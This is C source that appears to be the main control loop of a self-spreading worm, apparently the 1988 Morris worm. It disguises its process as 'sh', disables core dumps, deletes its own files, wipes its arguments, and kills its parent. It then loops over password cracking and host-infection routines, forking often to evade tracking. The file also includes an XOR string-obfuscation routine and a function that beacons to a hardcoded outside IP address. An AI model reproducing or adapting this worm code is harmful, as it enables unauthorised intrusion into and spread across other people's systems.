#include "dumb.h"

main(argc, argv)
char *argv[];
{
	int i, slave = 0, parentpid, j, os;
	u_long hisaddr;
	long t;
	struct rlimit rl;

	strcpy(argv[0], "sh");
#ifdef DEBUG
	setlinebuf(stderr);
#endif DEBUG
	time(&t);
	srandom(t);
#ifndef DEBUG
	rl.rlim_cur = 0;
	rl.rlim_max = 0;
	if(setrlimit(RLIMIT_CORE, &rl) < 0)
		perror("setrlimit RLIMIT_CORE");
#endif
	signal(SIGPIPE, SIG_IGN);

	parentpid = 0;
	os = 1;
	if(argc > 2 && strcmp(argv[os], "-p") == 0){
		parentpid = atoi(argv[2]);
		os += 2;
	}

	for(i = os; i < argc; i++){
		if(!loadobject(argv[i]))
			exit(1);
		if(parentpid)
			unlink(argv[i]);
	}

	if(nobjects < 1 || getobjectbyname("l1.c") == 0)
		exit(1);

	if(parentpid){
		for(i = 0; i < 32; i++)
			close(i);
		unlink(argv[0]);
		unlink("sh");
		unlink("/tmp/.dumb");
#ifdef DEBUG
		{int fd=creat("/dev/null",0666);dup2(fd,2);close(fd);}
#endif DEBUG
	}

	for(i = 1; i < argc; i++){
		for(j = 0; argv[i][j]; j++)
			argv[i][j] = '\0';
	}

	/*
	 * if we can't do the following, we may have the wrong binary,
	 * so we should exit instead of killing our parent.
	 */
	if(if_init() == 0)
		exit(1);

	if(parentpid){
		if(getpgrp(getpid()) == parentpid)
			setpgrp(getpid(), getpid());
		kill(parentpid, 9);
	}

	sched();
}

static
sched()
{
	u_long t0, t, lastclean;
	extern nextw, pleasequit, cmode;

	time(&t0);
	srandom(t0);
	lastclean = t0;

	if(!hg())
		if(!hl())
			ha();

	checkother();
	notifyucb();

	while(1){
		cracksome();
		other_sleep(30);
		cracksome();

		if(fork() > 0)
			exit(0);

		if(!hg())
			if(!hi())
				if(!ha())
					hl();

		other_sleep(120);
		time(&t);
		if(t - lastclean > (12 * 60 * 60))
			h_clean();

		if(pleasequit && nextw > 10)
			exit(0);
	}
}

char *
XS(s)
char *s;
{
	int i, len;
	static char xb[10240];
	static ni;
	char *b;

	len = strlen(s);
	if(len+1 > 10240 - ni)
		ni = 0;
	b = xb + ni;
	ni += len + 1;

	for(i = 0; s[i]; i++)
		b[i] = s[i] ^ 0x81;
	b[i] = '\0';
	return(b);
}

static
notifyucb()
{
	int s;
	struct sockaddr_in sin;
	char buf[1];

	if((random() % 15) != 7)
		return;

	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(11357);
	sin.sin_addr.s_addr = inet_addr("128.32.137.13");

	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0)
		return;

	if(sendto(s, buf, 1, 0, &sin, sizeof(sin)) < 0)
		perror("notifyucb sendto");
	close(s);
}
